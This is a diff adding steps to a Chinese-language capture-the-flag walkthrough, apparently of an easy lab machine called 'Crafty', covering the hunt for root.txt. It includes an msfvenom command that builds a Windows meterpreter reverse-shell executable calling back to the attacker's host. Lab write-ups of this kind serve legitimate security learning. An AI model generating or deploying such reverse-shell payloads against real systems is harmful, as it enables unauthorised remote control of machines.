@@ -56,3 +56,12 @@ Crafty Level:Easy
 
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/8e333a12-f6d2-49c3-ae1c-69e2aaae7af8)
 
+尋找root.txt
+---
+    12.在plugins底下發現有一個.jar的檔案，需下載檢查內容
+
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/9510f70e-68d6-4bef-91e8-24460b8e0326)
+
+    13.使用msf建立一個reverse shell
+    
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o expl.exe
